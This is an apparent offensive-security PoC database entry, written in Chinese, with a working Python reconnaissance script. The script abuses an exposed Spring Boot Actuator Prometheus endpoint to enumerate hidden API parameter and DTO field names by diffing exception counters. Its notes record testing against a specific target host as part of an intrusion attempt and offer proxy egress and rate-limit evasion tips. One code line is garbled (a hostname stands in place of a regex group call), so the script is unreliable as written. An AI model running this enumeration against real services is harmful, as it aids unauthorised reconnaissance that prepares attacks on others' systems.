# 用 Actuator prometheus 的 exception 标签做参数名/字段名 oracle（异常处理器统一返回 200 时的参数枚举法）

- **code**: 用-actuator-prometheus-的-exception-标签做参数名-字段名-oracle-异常处理器统一返回-200-时的参数枚举法
- **kind**: script
- **category**: info-leak
- **component**: Spring Boot Actuator (micrometer) + Spring MVC 参数绑定
- **severity**: info
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.120:8081 上实测有效，双向验证成立：① 对 /data/api/getAccount 与 /data/api/getData 发 ?code=123456 → miss=0 且 SuperException +1（证明 code 是正确的参数名、6 位格式校验通过并进入业务层，业务层因值不存在而拒绝）；发 ?id=123456 或完全不带参数 → miss=1（证明名字错误）。② 对 /data/api/confirmRelation 枚举 60+ 候选名（code/relationCode/relationId/companyCode/comCode/corpCode/siteCode/tenantCode/agentCode/proxyCode/memberCode/sign/key/token/appId/...）→ 全部 miss≥1，证明其真实参数名不在候选池内。③ 独立交叉验证（Jackson 路径）：对 /data/api/requireMemberData 发 {"code":"888888"}（字符串）→ {"code":2,"msg":"Http Message Not Readable"}（反序列化失败），发 {"code":888888}（数字）→ 200/37B 回到业务分支「重新确认关联」，证明 code 是真实存在的数字型 DTO 字段。原始日志：runs/param_oracle2.log、runs/oracle_getdata.py、runs/field_oracle.log、runs/field_oracle.py。该目标本轮未取得任何权限，本条目只沉淀方法。
- **path**: pocs/用-actuator-prometheus-的-exception-标签做参数名-字段名-oracle-异常处理器统一返回-200-时的参数枚举法/param_name_oracle_via_prometheus.py
- **tags**: spring-boot,actuator,prometheus,参数枚举,oracle,micrometer
- **created_at**: 2026-09-28T09:25:19.251Z
- **found_by**: exploit

## 描述

当 Spring Boot 全局异常处理器把参数绑定失败统一包装成 HTTP 200 + 固定 JSON（响应体无法做 oracle）时，改用应用自身的 Actuator prometheus 指标：micrometer 的 http_server_requests_seconds_count 带 exception 标签并按异常类型分别计数，比较同一 uri 的计数差即可精确判定参数名是否正确 —— 参数名错/缺失 → MissingServletRequestParameterException +1；参数名对但类型错 → MethodArgumentTypeMismatchException / HttpMessageNotReadableException +1；参数名与类型都对、进入业务逻辑 → Missing... 计数不增。同一思路可用于 JSON body 字段名枚举（给候选字段塞对象/字符串触发反序列化失败）。关键前提：该异常处理器把失败请求也计为 status=200/outcome=SUCCESS，所以只能靠 exception 标签区分，不能靠状态码。

## 用法

```
python param_name_oracle_via_prometheus.py
修改开头的 PROM（/actuator/prometheus 地址）、EP（待测接口）、URI（指标里的 uri 标签）、PROXY（可选出口）、NAMES（候选列表）即可。
判读：miss 列为 0 的行就是正确参数名；全部 miss=1 说明候选池没覆盖真实参数名。
注意：必须"拉指标 → 发请求 → 等 1.5~2s → 再拉指标"三步，指标刷新有延迟；受频次限制的目标要在循环里 sleep。
```

## 正文

```
# -*- coding: utf-8 -*-
"""用 Actuator prometheus 的 exception 标签做参数名 oracle。

适用场景：Spring Boot 应用装了 Actuator 且暴露 /actuator/prometheus，
且其全局异常处理器把所有参数绑定失败都包装成"HTTP 200 + 固定 JSON"，
导致无法用响应体判定参数名是否正确。

原理：micrometer 的 http_server_requests_seconds_count 带 exception 标签，
按异常类型分别累计。参数名错 -> MissingServletRequestParameterException；
参数名对、类型错 -> MethodArgumentTypeMismatchException / HttpMessageNotReadableException；
参数名对、类型对（进入业务逻辑）-> 该 uri 的 Missing... 计数不增。
"""
import re
import time
import urllib.request

PROM = "http://TARGET:8081/actuator/prometheus"      # 指标端点（通常可直连）
EP = "http://TARGET:8081/data/api/confirmRelation"   # 待测接口
URI = "/data/api/confirmRelation"                    # 该接口在指标里的 uri 标签值
PROXY = None            # 如需换出口： "http://127.0.0.1:7892"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
INTERVAL = 1.6          # 两次拉指标之间的等待（等指标刷新）

NAMES = ["code", "id", "relationCode", "companyCode", "userId", "sign", "token", "appId"]

opener = (urllib.request.build_opener(
    urllib.request.ProxyHandler({"http": PROXY, "https": PROXY})) if PROXY
    else urllib.request.build_opener())


def counts():
    """返回 {exception_label: count} —— 只取目标 uri 的 count 指标。"""
    req = urllib.request.Request(PROM, headers={"User-Agent": UA})
    with urllib.request.urlopen(req, timeout=20) as r:
        txt = r.read().decode("utf-8", "replace")
    out = {}
    for line in txt.splitlines():
        if "http_server_requests_seconds_count" in line and ('uri="%s"' % URI) in line:
            m = re.search(r'exception="([^"]*)"', line)
            v = line.rsplit("}", 1)[-1].strip()
            try:
                out[target22.example.com(1) if m else "?"] = float(v)
            except ValueError:
                pass
    return out


def call(qs):
    url = EP + ("?" + qs if qs else "")
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with opener.open(req, timeout=25) as r:
            return r.read().decode("utf-8", "replace")[:120]
    except Exception as e:
        return "<EXC %s: %s>" % (type(e).__name__, e)


if __name__ == "__main__":
    print("[baseline] %s" % counts())
    for name in NAMES:
        before = counts()
        resp = call("%s=1" % name)
        time.sleep(INTERVAL)
        after = counts()
        diff = {k: round(after.get(k, 0) - before.get(k, 0), 1)
                for k in set(list(after) + list(before))}
        diff = {k: v for k, v in diff.items() if v}
        miss = diff.get("MissingServletRequestParameterException", 0)
        print("%-16s miss=%-4s resp=%-34s diff=%s%s"
              % (name, miss, resp.replace("\n", ""), diff,
                 "" if miss else "   <<<<< 正确参数名"))
    # body 字段名变体：给候选字段塞对象/字符串触发反序列化失败，
    # 若该字段名存在于 DTO，则 HttpMessageNotReadableException 计数会 +1。

```
